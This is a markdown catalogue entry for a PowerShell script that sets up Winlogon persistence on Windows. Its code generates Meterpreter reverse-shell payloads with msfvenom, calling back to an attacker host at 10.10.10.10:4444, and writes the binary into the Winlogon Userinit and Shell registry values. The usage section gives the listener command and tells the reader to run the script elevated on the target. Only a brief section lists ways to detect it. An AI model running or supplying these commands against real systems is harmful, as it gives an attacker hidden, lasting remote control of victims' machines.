---
id: e3dc39e4-88cf-4a28-bee8-ace87e119e89
name: winlogon-persistence-setup-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:28.015281+00:00'
updated_at: '2023-04-10T20:37:21.625389+00:00'
platforms:
  - Windows
tags:
  - persistence
  - registry
  - meterpreter
validated: true
---

# winlogon-persistence-setup-script

## Code

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```

## Description

This script combines payload generation with registry modification to set up Winlogon-based persistence. It creates Meterpreter reverse shells and appends the EXE to startup keys, though note the mixed syntax (msfvenom and reg add are external calls executable in PowerShell). The DLL payload is generated but unused in the registry steps.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LHOST | Attacker's IP for reverse connection | 10.10.10.10 |
| LPORT | Listening port on attacker machine | 4444 |
| evilbinary.exe | Output EXE filename (hardcoded; modify for custom) | evilbinary.exe |
| evilbinary.dll | Output DLL filename (hardcoded; modify for custom) | evilbinary.dll |

## Usage

Execute in an elevated PowerShell session on the target Windows machine with Metasploit accessible (e.g., via PATH). Start a listener with `msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <port>; run"` before running the script. Reboot the target to trigger persistence.

## Detection

- Registry audits showing modifications to Winlogon\Userinit or Shell (Event ID 4657).
- Presence of suspicious files like evilbinary.exe in working directories.
- Outbound connections to LHOST:LPORT from SYSTEM process at boot (network logs, Sysmon Event ID 3).
- PowerShell execution logs (Module Logging, Script Block Logging) capturing msfvenom or Set-ItemProperty calls.

## Related

- [[procedures/windows-registry-hklm-winlogon-persistence]]
